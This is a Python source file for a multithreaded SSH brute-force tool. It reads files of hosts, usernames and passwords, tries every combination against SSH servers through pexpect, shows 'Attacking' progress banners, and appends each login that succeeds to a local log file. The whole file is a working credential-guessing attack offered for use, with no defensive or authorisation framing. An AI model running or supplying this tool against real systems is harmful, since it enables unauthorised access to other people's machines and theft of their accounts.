from pexpect import pxssh
from threading import Thread, BoundedSemaphore
from datetime import datetime
import optparse



maxConnections = 10
connection_lock = BoundedSemaphore(maxConnections)
time = datetime.now().time()


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ENDC = '\033[0m'


def connect(server, user, password):

    fails = 0
    try:
        s = pxssh.pxssh()
        s.login(server, user, password)
        print (bcolors.OKGREEN + "Password Found : " +server+ "/" + user + "/" + password + bcolors.ENDC)
        client = server + "," + user + "," + password + "\n"
        f = open('log.txt', 'a')
        f.write(client)
        f.close()
        return s

    except Exception:
        connection_lock.release()
        fails += 1
        if fails > 2:
            print ("[-] Too many socket timeouts")
            exit(0)
        return None


# Rotates through the list and creates tests
def generate_tests(hosts, users, passwords):
    i = 0
    for host in hosts:
        server = host.strip('\n\r')
        for user in users:
            user = user.strip('\n\r')
            for password in passwords:
                connection_lock.acquire()
                password = password.strip('\n\r')
                print(chr(27) + "[2J")
                print (bcolors.OKGREEN + "=" * 60 + bcolors.ENDC)
                print (bcolors.BOLD + "Attacking: " + bcolors.OKBLUE + server + bcolors.ENDC)
                print (bcolors.BOLD + "Username: " + bcolors.OKBLUE + user + bcolors.ENDC)
                print (bcolors.BOLD + "Password: " + bcolors.OKBLUE + password + bcolors.ENDC)
                i += 1
                print (bcolors.BOLD + "Attempts: " + bcolors.OKBLUE + str(i) + bcolors.ENDC)
                print (bcolors.BOLD + "Time Started: " + bcolors.OKBLUE + str(time) + bcolors.ENDC)
                print (bcolors.BOLD + "Time now: " + bcolors.OKBLUE + str(datetime.now().time()) + bcolors.ENDC)
                print (bcolors.OKGREEN + "=" * 60 + bcolors.ENDC)
                t = Thread(target=connect, args=(server, user, password))
                t.start()


# Reads the text files because fk it, thats how I roll.
def read_test_files(hostsfile, usersfile, passwordfile):
    hosts = open(hostsfile, 'r').readlines()
    users = open(usersfile, 'r').readlines()
    passwords = open(passwordfile, 'r').readlines()
    generate_tests(hosts, users, passwords)


def main():
    parser = optparse.OptionParser('usage python sshbrute -H <hosts file> -U <users file> -P <password file>')
    parser.add_option('-H', dest='hostsfile', help="specify host file to test")
    parser.add_option('-U', dest='usersfile', help="specify possible users to test")
    parser.add_option('-P', dest='passwordfile', help="specify possible passwords to test")

    (options, args) = parser.parse_args()

    if options.hostsfile and options.usersfile and options.passwordfile:
        hostsfile = options.hostsfile
        usersfile = options.usersfile
        passwordfile = options.passwordfile
        read_test_files(hostsfile, usersfile, passwordfile)

    else:
        print (parser.usage)
        exit(0)




if __name__ == "__main__":
    main()